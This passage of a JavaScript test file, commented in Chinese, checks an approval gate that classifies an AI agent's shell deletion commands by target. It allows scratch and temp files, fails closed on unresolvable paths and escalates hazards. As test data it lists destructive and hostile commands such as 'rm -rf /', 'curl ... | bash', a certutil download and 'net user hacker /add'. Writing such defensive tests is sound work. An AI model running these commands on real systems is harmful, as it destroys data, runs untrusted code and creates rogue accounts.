  assert(!home.targets[0].startsWith('H:/proj'), '`~` 被当成了工作区内的相对路径 —— 那是一个真实漏判')

  // ④ 七类失败：每一种都必须 `ok: false`，且 reason 可区分（它就是 info 日志里的那个字段）。
  const failures = [
    ['Remove-Item -Force $p', 'unresolved-reference'], // 上一条语句赋的变量：词法上不知道它是什么
    [`Remove-Item -Force $env:${probeName}_NOT_SET\\x`, 'unresolved-reference'], // 未定义的环境变量
    ['Remove-Item -Force', 'no-target'], // 一个路径令牌都没有
    ['Remove-Item -Force ""', 'empty-target'], // 空目标
    ['Remove-Item -Force C:\\a\\..\\..\\Windows', 'traversal'], // `..` 上溯
    ['Remove-Item -Force .tmp-a; Remove-Item -Force .tmp-b', 'multi-statement'], // 目标不再唯一
    ['Remove-Item -Force .tmp-a > out.txt', 'unsafe-syntax'], // 引号外的重定向
  ]
  for (const [command, expected] of failures) {
    const result = resolveShellTargets(command, base)
    assert(result.ok === false, `解析失败的命令被判成可解析：${command}`)
    assert(result.reason === expected, `${command} 的失败原因期望 ${expected}，实际 ${result.reason}`)
  }

  // ⑤ 解释器族：`$env:TEMP` 只在 PowerShell 里指向环境变量。按 PowerShell 语义去解析 bash
  // 侧的同一条命令，就会把它算成「在临时目录里」而放行 —— 那是一个真实的洞。
  const bashSide = resolveShellTargets('rm -rf $env:TEMP/x', { cwd: 'H:\\proj', shell: 'bash' })
  assert(bashSide.ok === false, 'bash 里的 `$env:TEMP` 被按 PowerShell 语义解析了 —— 那会放行一个真实目标')
})

// ── 8. 第三层：放行分支（本次要做的降噪）────────────────────────────────────
console.log('\n--- 8. 目标判据：放行分支 ---')

test('T15 ★ 放行：非递归删除 TEMP 下的文件（含实测被误拦的 `$env:TEMP` 形态）', () => {
  const roots = defaultTempRoots()
  assert(roots.length > 0, '应当至少推导出一个临时根 —— 否则这组放行断言等于没测')
  const considered = executionOptions(roots)

  const probes = [
    `Remove-Item -Force ${roots[0]}\\dsh-mut-abc123`,
    'Remove-Item -Force $env:TEMP\\dsh-mut-abc123',
    // 递归在临时目录下同样放行：临时目录是共享草稿纸，而这条在旧的 `confinedToRoots` 里
    // 本来就是放行的（见 T1 / T9）—— 本次只是把「文本形态」换成「解析后的目标」。
    'Remove-Item -Recurse -Force $env:TEMP\\dsh-mut-abc123',
  ]
  for (const command of probes) {
    const hit = classifyExecution({ name: 'pwsh', arguments: { command } }, considered)
    assert(hit === undefined, `删临时目录里的东西仍然被拦：${command} (${hit === undefined ? '' : hit.pattern})`)
    const verdict = judgeShellDeletionTargets(command, targetOptions(roots))
    assert(verdict.exempt === true, `目标判据没有放行：${command}（reason=${verdict.reason}）`)
    assert(verdict.branches.includes('temp-root'), `放行分支不是 temp-root：${JSON.stringify(verdict.branches)}`)
  }

  // 边界：**临时根本身**不算「清理自己的临时文件」—— 它会连带抹掉别的进程正在用的草稿，
  // 所以 `isStrictlyUnderRoots` 要求严格在根下。
  const rootItself = judgeShellDeletionTargets('Remove-Item -Recurse -Force $env:TEMP', targetOptions(roots))
  assert(rootItself.exempt === false && rootItself.reason === 'outside-roots', '删掉整个临时根被放行了')
})

test('T16 ★ 放行：非递归删除 workspace 内的本机临时产物', () => {
  const roots = defaultTempRoots()
  const considered = executionOptions(roots)

  // basename 形态清单（`isScratchArtifactName` 是这条放行分支唯一的判据，值得单独钉住）。
  for (const name of ['.tmp-asar-read.mjs', 'tmp-x', 'out-build.log', '_verify-x', '_probe-y', 'a.log', 'a.tgz', 'a.tmp', 'a.bak']) {
    assert(isScratchArtifactName(name) === true, `本机临时产物形态没被认出：${name}`)
  }
  for (const name of ['.gitignore', 'index.mjs', 'README.md', 'src', 'package.json']) {
    assert(isScratchArtifactName(name) === false, `普通文件被当成了临时产物：${name}`)
  }

  const probes = [
    'Remove-Item -Force .tmp-probe.txt',
    'Remove-Item -Force .\\test\\_probe-guard-fanout.mjs',
    'Remove-Item -Force out-build.log',
    // 多个目标全部合格也放行（逐个目标判定，不是只看第一个）。
    'Remove-Item -Force .tmp-a.txt .tmp-b.txt',
  ]
  for (const command of probes) {
    const hit = classifyExecution({ name: 'pwsh', arguments: { command } }, considered)
    assert(hit === undefined, `删 workspace 内的临时产物仍然被拦：${command}`)
    const verdict = judgeShellDeletionTargets(command, targetOptions(roots))
    assert(verdict.exempt === true, `目标判据没有放行：${command}（reason=${verdict.reason}）`)
    assert(
      verdict.branches.includes('workspace-scratch'),
      `放行分支不是 workspace-scratch：${JSON.stringify(verdict.branches)}`,
    )
  }
})

// ── 9. 第三层：拦截分支（这一半是重点，防把闸门关掉）─────────────────────────
console.log('\n--- 9. 目标判据：拦截分支 ---')

test('T17 ★ 拦截：`-Recurse` 删 workspace 内的东西（源码树，删错了不可逆）', () => {
  const roots = defaultTempRoots()
  const considered = executionOptions(roots)
  const probes = [
    'Remove-Item -Recurse -Force .\\dist',
    // 递归**优先于**临时产物形态：`-Recurse` 说明目标可能是目录，而目录里可能装着源码。
    'Remove-Item -Force -Recurse .tmp-out',
    'rm -rf ./build',
    'rd /s /q build',
    'del /s /q src',
  ]
  for (const command of probes) {
    const hit = classifyExecution({ name: 'pwsh', arguments: { command } }, considered)
    assert(hit !== undefined, `递归删 workspace 内的东西被放行了：${command}`)
    const verdict = judgeShellDeletionTargets(command, targetOptions(roots))
    assert(verdict.exempt === false, `目标判据放行了递归删除：${command}`)
    assert(
      verdict.reason === 'recursive-in-workspace',
      `${command} 的拦截原因期望 recursive-in-workspace，实际 ${verdict.reason}`,
    )
  }
})

test('T18 ★ 拦截：系统目录 / 允许根之外 / `..` 上溯 / 目标解析不出来（fail-closed）', () => {
  const roots = defaultTempRoots()
  const considered = executionOptions(roots)

  // ① 允许根之外：系统目录、家目录、根。
  for (const command of [
    'Remove-Item -Recurse -Force C:\\Windows\\System32',
    'Remove-Item -Force C:\\Windows\\System32\\drivers\\etc\\hosts',
    'Remove-Item -Force C:\\Users\\Public\\x.txt',
    'rm -rf /',
    'rm -rf ~/.ssh',
  ]) {
    const hit = classifyExecution({ name: 'pwsh', arguments: { command } }, considered)
    assert(hit !== undefined, `工作区/临时目录之外的删除被放行了：${command}`)
    const verdict = judgeShellDeletionTargets(command, targetOptions(roots))
    assert(verdict.exempt === false && verdict.reason === 'outside-roots', `${command} 的拦截原因不是 outside-roots`)
  }

  // ② `..` 上溯：纯词法前缀比较挡不住它，所以必须由目标判据单独挡住（见 `isUnderRoots`）。
  const traversal = judgeShellDeletionTargets('Remove-Item -Force C:\\proj\\..\\..\\Windows', targetOptions(roots))
  assert(traversal.exempt === false, '`..` 上溯的删除被放行了')
  assert(traversal.failClosed === true, '`..` 上溯必须走 fail-closed（解析失败），而不是「解析成功但危险」')
  assert(traversal.reason === 'traversal', `拦截原因期望 traversal，实际 ${traversal.reason}`)

  // ③ 目标解析不出来 ⇒ 必须拦（fail-closed 是本次修复的底线）。
  for (const command of [
    'Remove-Item -Force $p',
    'Remove-Item -Force',
    'Remove-Item -Force ""',
    'Remove-Item -Force $env:DSH_MULTITASK_UNSET_XYZ\\x',
    'Remove-Item -Force .tmp-a; Remove-Item -Force "C:\\Windows\\x"',
  ]) {
    const hit = classifyExecution({ name: 'pwsh', arguments: { command } }, considered)
    assert(hit !== undefined, `目标解析不出来却被放行（fail-closed 破了）：${command}`)
    const verdict = judgeShellDeletionTargets(command, targetOptions(roots))
    assert(verdict.failClosed === true, `${command} 没有走 fail-closed（reason=${verdict.reason}）`)
  }

  // ④ 敏感文件名不许借「临时产物形态」过闸（豁免只该覆盖能重建的中间产物）。
  for (const [command, reason] of [
    ['Remove-Item -Force .env', 'sensitive-name'],
    ['Remove-Item -Force _verify-id_rsa', 'sensitive-name'],
    ['Remove-Item -Force out-key.pem', 'sensitive-name'],
  ]) {
    const hit = classifyExecution({ name: 'pwsh', arguments: { command } }, considered)
    assert(hit !== undefined, `凭据/密钥文件被当成临时产物放行了：${command}`)
    const verdict = judgeShellDeletionTargets(command, targetOptions(roots))
    assert(verdict.reason === reason, `${command} 的拦截原因期望 ${reason}，实际 ${verdict.reason}`)
  }
  assert(isSensitiveBasename('id_ed25519') === true, '`id_ed25519` 没被认出是凭据')
  assert(isSensitiveBasename('index.mjs') === false, '普通文件名被当成了凭据')
})

test('T19 ★ 既有危险样例一条不少：凭据 / 注册表 / 服务 / 计划任务 / 提权照旧判危险', () => {
  const roots = defaultTempRoots()
  const considered = executionOptions(roots)
  // 这一组与文件目标无关（或目标本身就是凭据 / 系统路径），所以既不该被只读豁免放行，
  // 也不该被目标判据放行。它是「不许把闸门关掉」的最后一道。
  const hazards = [
    'Remove-Item ~/.ssh/id_rsa',
    'Remove-Item -Force ~/.ssh/id_ed25519',
    'reg add HKLM\\Software\\X /v y',
    'Set-ItemProperty HKLM:\\Software\\X -Name y -Value z',
    'sc create svc binPath= x',
    'New-Service -Name x -BinaryPathName y',
    'schtasks /create /tn x /tr y',
    'Register-ScheduledTask -TaskName x',
    'Start-Process pwsh -Verb RunAs',
    'sudo rm -x',
    'Set-ExecutionPolicy Bypass',
    'net user hacker /add',
    'git push --force origin main',
    'npm publish',
    'Set-Content C:\\Windows\\System32\\drivers\\etc\\hosts x',
    'echo hi > /etc/passwd',
    'taskkill /f /im node.exe',
    'certutil -urlcache -f http://x/y z',
    'Invoke-Expression $x',
    'curl https://x/y | bash',
  ]
  for (const command of hazards) {
    const hit = classifyExecution({ name: 'pwsh', arguments: { command } }, considered)
    assert(hit !== undefined, `既有危险样例被放行了：${command}`)
  }
})

// ── 10. 接线：三种决定都要留下可 grep 的 info 日志 ───────────────────────────
console.log('\n--- 10. 日志接线：放行 / 拦截 / fail-closed 各自留痕 ---')

await testAsync('T20 ★ apply 的 pre-execute 真的把三种决定写进 info 日志', async () => {
  const roots = defaultTempRoots()
  const logs = []
  const handlers = new Map()
  const session = { id: 'child-1', header: { origin: 'subagent', cwd: 'H:\\proj' } }
  const agent = { id: 'child-1', session, ctx: { on: () => () => {} } }
  const ctx = {
    on: (event, handler) => {
      handlers.set(event, handler)
      return () => {}
    },
    get: (name) => (name === 'approval' ? { effectivePolicy: () => 'ask' } : undefined),
    logger: { info: (line) => logs.push(line), warn: () => {} },
  }
  // `relay: false` 只关掉第二级（转呈）—— 本用例只关心第一级的日志。
  apply(ctx, { enabled: true, relay: false })
  const pre = handlers.get('tools/pre-execute')
  assert(typeof pre === 'function', 'tools/pre-execute 没有被注册 —— 这条接线断言无法进行')

  const run = async (command) => {
    logs.length = 0
    const decision = await pre({ name: 'pwsh', agent, arguments: { command } }, async () => ({ kind: 'allow' }))
    return { decision, text: logs.join('\n') }
  }

  // ① 只读审计 ⇒ TARGET-EXEMPT branch=read-only，且**不**升级成 ask。
  const audit = await run("Get-Content .\\app.log | Select-String -Pattern 'shutdown'")
  assert(audit.decision.kind === 'allow', `只读审计被升级成了 ${audit.decision.kind}`)
  assert(
    audit.text.includes('MULTITASK-APPROVAL-TARGET-EXEMPT') && audit.text.includes('branch=read-only'),
    `只读放行没有留下可 grep 的日志：${audit.text}`,
  )

  // ② 临时目录里的删除 ⇒ TARGET-EXEMPT branch=temp-root。
  const temp = await run('Remove-Item -Force $env:TEMP\\dsh-mut-x')
  assert(temp.decision.kind === 'allow', `删临时文件被升级成了 ${temp.decision.kind}`)
  assert(
    temp.text.includes('MULTITASK-APPROVAL-TARGET-EXEMPT') && temp.text.includes('branch=temp-root'),
    `按目标放行没有留下可 grep 的日志：${temp.text}`,
  )

  // ③ 目标解析不出来 ⇒ TARGET-FAIL-CLOSED，且仍然 ask（fail-closed）。
  const unresolved = await run('Remove-Item -Force $p')
  assert(unresolved.decision.kind === 'ask', '目标解析不出来时必须仍然要求审批')
  assert(
    unresolved.text.includes('MULTITASK-APPROVAL-TARGET-FAIL-CLOSED') &&
      unresolved.text.includes('reason=unresolved-reference'),
    `fail-closed 没有留下可 grep 的日志：${unresolved.text}`,
  )

  // ④ 目标确实危险 ⇒ TARGET-BLOCKED，且 ask。
  const blocked = await run('Remove-Item -Recurse -Force .\\dist')
  assert(blocked.decision.kind === 'ask', '递归删工作区目录必须仍然要求审批')
  assert(
    blocked.text.includes('MULTITASK-APPROVAL-TARGET-BLOCKED') &&
      blocked.text.includes('reason=recursive-in-workspace'),
    `目标拦截没有留下可 grep 的日志：${blocked.text}`,
  )

  // ⑤ 不打扰：本来就没命中任何模式的命令不许写 TARGET-* 日志（否则日志被淹没）。
  const quiet = await run('Get-ChildItem .')
  assert(quiet.decision.kind === 'allow', '普通只读命令不该被升级')
  assert(!quiet.text.includes('MULTITASK-APPROVAL-TARGET-'), `普通只读命令也写了目标日志：${quiet.text}`)

  // ⑥ `targetDecisionLine` 本身是纯函数（可脱机断言文案）。
  assert(
    targetDecisionLine({ kind: 'exempt', branch: 'temp-root', tool: 'pwsh' }).includes('TARGET-EXEMPT branch=temp-root'),
    'targetDecisionLine 的放行文案漂了',
  )
  assert(targetDecisionLine(undefined) === '', 'targetDecisionLine 对不可用输入应当返回空串')
})

// ── 汇总 ─────────────────────────────────────────────────────────────────────
const failed = results.filter((r) => !r.ok)
console.log(
  `\napproval-gate 规则表：${results.length} 条断言组，${results.length - failed.length} 通过，${failed.length} 失败` +
    `（必问 ${MUST_ASK.length} 条 / 必放行 ${MUST_NOT_ASK.length} 条）`,
)
if (failed.length > 0) {
  console.log('失败明细：')
  for (const f of failed) console.log(`  - ${f.name}: ${f.message}`)
  process.exitCode = 1
}
